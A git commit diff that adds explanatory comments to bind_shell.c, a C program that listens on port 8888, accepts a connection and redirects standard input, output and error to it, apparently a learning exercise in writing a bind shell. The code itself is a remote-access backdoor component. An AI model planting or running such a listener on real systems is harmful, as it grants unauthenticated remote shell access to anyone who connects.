f3ea051a785fe7853ebbd124b868e8cd12001e0c
b0rm4 <sanakan-re@protonmail.com>
2020-07-09 16:37:10 -0400

    Add comments

--- bind_shell.c
+++ bind_shell.c
@@ -17,23 +17,28 @@ int main(int argc, char *argv[])
 	if (listen_sock < 0)
 		error("ERROR opening socket");
 
-	struct sockaddr_in server_addr;
-	server_addr.sin_family = AF_INET;
-	server_addr.sin_addr.s_addr = INADDR_ANY;
-	server_addr.sin_port = htons(8888);
+	// A sockaddr_in is a structure containing an internet address.
+	// This structure is defined in <netinet/in.h>.
 
+	struct sockaddr_in server_addr;
+	server_addr.sin_family = AF_INET;           // address family
+	server_addr.sin_addr.s_addr = INADDR_ANY;   // IP address of the host
+	server_addr.sin_port = htons(8888);         // port number
+
+	// Binds a socket to an address
 	int bind_verif = bind(listen_sock, (struct sockaddr*)&server_addr, 
 			sizeof(server_addr));
 	if (bind_verif < 0)
 		error("ERROR on binding");
 	
+	// Allows the process to listen on the socket for connections
 	listen(listen_sock, 0);
 
 	int conn_sock = accept(listen_sock, NULL, NULL);
 	if (conn_sock < 0)
 		error("ERROR on accept");
 
-	// 
+	 
 	for (int i=0; i<3; ++i) {
 		dup2(conn_sock, i);
 	}
